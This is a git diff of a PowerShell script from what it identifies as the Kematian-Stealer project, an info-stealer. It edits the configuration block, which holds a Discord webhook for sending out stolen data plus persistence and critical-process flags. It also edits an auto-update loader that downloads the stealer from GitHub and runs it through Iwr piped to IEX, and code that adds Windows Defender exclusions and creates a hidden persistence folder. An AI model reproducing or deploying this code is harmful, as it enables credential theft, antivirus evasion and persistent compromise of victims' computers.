@@ -1,4 +1,4 @@
-$webhook = "YOUR_WEBHOOK_HERE" # DONT USE THIS IF YOU ENABLE AUTO UPDATE INSTEAD REPLACE "PUT YOUR WEBHOOK HERE IF YOU NEED AUTOUPDATE" WITH YOUR DISCORD WEBHOOK
+$webhook = "YOUR_WEBHOOK_HERE" # DONT USE THIS IF YOU NEED UPDATES DIRECTLY FROM THE REPOSITORY REPLACE "AUTOUPDATE WEBHOOK" IN LINE 44 WITH YOUR DISCORD WEBHOOK
 $debug = $false
 $autoupdate = $false
 $blockhostsfile = $true
@@ -6,7 +6,6 @@ $criticalprocess = $true
 $melt = $false
 $fakeerror = $false
 $persistence = $true
-
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -41,7 +40,7 @@ function AUTOUPDATE {
 	Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
     $Content = @"
-`$t=(Iwr -Uri "https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/main.ps1" -useb);`$t-replace "YOUR_WEBHOOK_HERE", "PUT YOUR WEBHOOK HERE IF YOU NEED AUTOUPDATE" | IEX
+`$t=(Iwr -Uri "https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/main.ps1" -useb);`$t-replace "YOUR_WEBHOOK_HERE", "AUTOUPDATE WEBHOOK" | IEX
 "@
     [IO.File]::WriteAllText("$env:APPDATA\Kematian\Kematian.ps1", $Content)
 	$KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
@@ -1138,10 +1137,10 @@ FileZilla: $filezilla_info
 }
 
 function Invoke-TASKS {
-    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
+    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
 	if ($persistence) {
-	Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"	
-    Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
+	Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
+    Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
     New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
     # Hidden Directory
     $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
